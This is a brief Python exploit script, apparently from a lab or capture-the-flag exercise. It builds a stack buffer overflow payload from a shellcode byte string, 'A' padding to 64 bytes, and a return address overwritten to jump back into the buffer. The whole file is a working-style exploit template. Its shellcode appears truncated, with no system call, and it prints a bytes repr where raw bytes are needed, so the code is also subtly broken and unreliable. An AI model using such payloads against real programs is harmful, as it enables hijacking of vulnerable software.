# exploit.py
import struct

# Address of the start of the buffer (this needs to be determined via gdb)
buffer_start_address = 0x7fffffffe410  # example

# Shellcode
shellcode = (
    b"\x48\x31\xff\xb0\x69\x48\xc1\xe8\x18\x48\xc1\xe0\x18\x48\x89\xc6"
) # example

# Padding to reach the return address
padding = b"A" * (64 - len(shellcode))

# Overwrite the return address with the address of the buffer start
exploit_payload = shellcode + padding + struct.pack("<Q", buffer_start_address)

# Print the payload
print(exploit_payload)